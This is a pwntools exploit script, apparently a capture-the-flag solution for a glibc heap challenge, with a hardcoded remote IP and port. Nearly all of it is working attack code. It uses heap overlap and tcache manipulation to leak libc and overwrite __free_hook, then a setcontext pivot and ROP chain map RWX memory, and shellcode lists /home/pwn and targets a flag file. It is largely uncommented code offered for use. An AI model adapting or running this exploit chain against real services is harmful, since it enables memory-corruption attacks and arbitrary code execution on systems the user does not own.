from pwn import *
def cmd(c):
	p.sendline(str(c).encode('utf8'))
def add(size,c=b'A'):
	cmd(1)
	cmd(size)
	p.sendline(c)
def maga(s):
	cmd(0)
	p.sendline(s)
def bits(index,k=1):
	bitmap=[0]*0x80
	bitmap[index]=k
	bitmap=bytes(bitmap)
	return bitmap
def X(x=''):
	if(DEBUG):
		gdb.attach(p,x)
DEBUG=1
if(DEBUG):
	p=process("./pwn")
	context.log_level='debug'
else:
	p=remote("1.117.189.158",60001)
	#p=process("./pwn")
	#p=remote("192.168.174.1",60001)
	p=remote("0.0.0.0",1025)


maga(b"-"+str(0xa0160//8).encode('utf8'))
X()
context.arch='amd64'
cmd(0)

#context.log_level='debug'
add(0x288,bits(20)+b"\x00"*(0x128)+p64(0xdeadbeef))

add(0x80)#pad to avoid heap-guess
add(0xa8,b"\0"*0x88+p64(0xd1))
add(0xb0)
add(0x288,bits(18)+p64(0)*0x9+b'\x90')
add(0xa8,p64(0)*3+p64(0xc1))#overlap
add(0xc8,p64(0)*3+p64(0xff1))# modify chunkd head

for x in range(9):
	add(0x408,p64(0x21)*(0x3f0//8))
	add(0x288,bits(8))
add(0x408,p64(0x21)*(0x3f0//8))
add(0x288,bits(8))
add(0x288,bits(20))
add(0xb8)#unsotred bin get
add(0x288,b'\0'*0x287)#clear

add(0x430)#leave a libc address
add(0x370)
add(0x98)
add(0x288,bits(16,8)+p64(0)*8+b'\xf0')# overlap
add(0x88,b'\0'*0x18+p64(0xc1))#edit head
add(0x98)# we have a libc chunk at the top of tcache
add(0x288,bits(16,1)+p64(0)*8+b'\xf0\xa3')# overlap and modify the point now it points at bitmap in arana 1/16

# creat a avaliable binmap largebin size= [670]
add(0xc8)#pad
add(0x3f8)#pad
add(0x680)#creat the binmap, head == 200, address= 0x7ffff7f5a3f0-0x10

add(0x98)
add(0x1f8,b'\0'*0x108+p64(0xf1))# fake a new head just before the strol-space struct in order to set a value on that!
add(0x288,bits(30*2,1)+p64(0)*30+b'\x00\xa5')# fetch the fake one
add(0x1f8,b'\0'*0x1a0+p64(0x1800)+b'\0'*0x18+b'\xe0\x32')#1/16
cmd(0)

while(1):
	data=p.read(8)
	print(data)
	if(b"gift" not in data & data!=b''):
		break
base=u64(data)-(0x7ffff7fb19a0-0x7ffff7d6e000)
log.warning(hex(base))
if(base&0xffff000000000000!=0):
	exit(1)


add(0x288,bits(30*2)+p64(0)*30+p64(base+0x1eeb28))# leave a __free_hook on tacache

setcontext=0x7ffff7dc60dd-0x7ffff7d6e000+base
rdx2rdi=0x7ffff7ec2930-0x7ffff7d6e000+base
address=0x7ffff7f5cb30-0x7ffff7d6e000+base
rdi=0
rsi=address+0xc0
rdx=0x100
read=0x7ffff7e7f130-0x7ffff7d6e000+base
rsp=rsi
rbp = 153280+base
leave=371272+base

struct =p64(address)+p64(0)*3+p64(setcontext)
struct =struct.ljust(0x68,b'\0')
struct+=p64(rdi)+p64(rsi)+p64(0)*2+p64(rdx)+p64(0)*2+p64(rsp)+p64(read)
add(0x1f8,p64(rdx2rdi)+struct)
X("b mmap")
rdx = 0x000000000011c371+base# rdx+r12
sys = 0x7ffff7e7f1e5-0x7ffff7d6e000+base
rax = 304464+base
rdi = 158578+base
rsi = 161065+base
rcx = 653346+base
rax_r10 = 0x000000000005e4b7+base
orw=[ rdi,0xdddd000,rsi,0x1000,rdx,7,0,rcx,0x22,0x7ffff7e89a20-0x7ffff7d6e000+base,#mmap(0xdddd000,0x1000,7,0x22,0,0)
rax,0,rdi,0,rsi,0xdddd000,rdx,0x1000,0,sys,0xdddd000
]
rop=flat(orw)
p.send(rop.ljust(0x100,b'\0'))

#context.log_level='debug'
sc='''
mov rax,1
mov rdi,1
mov rsi,0xdddd300
mov rdx,0x600
syscall
'''
fk='''
mov rdi,rax
mov rax,0
mov rsi,0xdddd300
mov rdx,100
syscall
mov rax,1
mov rdi,rax
syscall
'''
#poc = asm(shellcraft.open(b"/home/pwn/flag-asdasdasdasd"))+asm(fk)
poc = asm(shellcraft.open(b'/home/pwn/'))+asm(shellcraft.getdents64(3, 0xdddd000 + 0x300, 0x600))+asm(sc)
p.send(poc)

p.interactive()
